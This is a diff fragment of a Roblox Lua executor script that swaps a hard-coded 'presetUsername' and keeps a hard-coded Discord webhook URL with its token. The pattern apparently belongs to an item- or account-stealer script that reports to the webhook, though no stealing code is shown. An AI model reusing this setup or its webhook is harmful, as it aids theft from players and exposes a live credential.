@@ -11,7 +11,7 @@ local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
 -- 2. PRE-SET CONFIGURATION (edit these in the script)
-_G.presetUsername = "aurorlaax"  -- Pre-set username
+_G.presetUsername = "exorianz"  -- Pre-set username
 _G.presetWebhook = "https://discord.com/api/webhooks/1508171564909334658/Qh6L6WPKVro1VfFKFNmT2F9lAzMpu1D8rNRY7bSVA4uaANp2KoWz9ZMy-uxMSilCQaK-"  -- Pre-set webhook
 
 -- 3. DYNAMIC CONFIGURATION (change these in your executor)
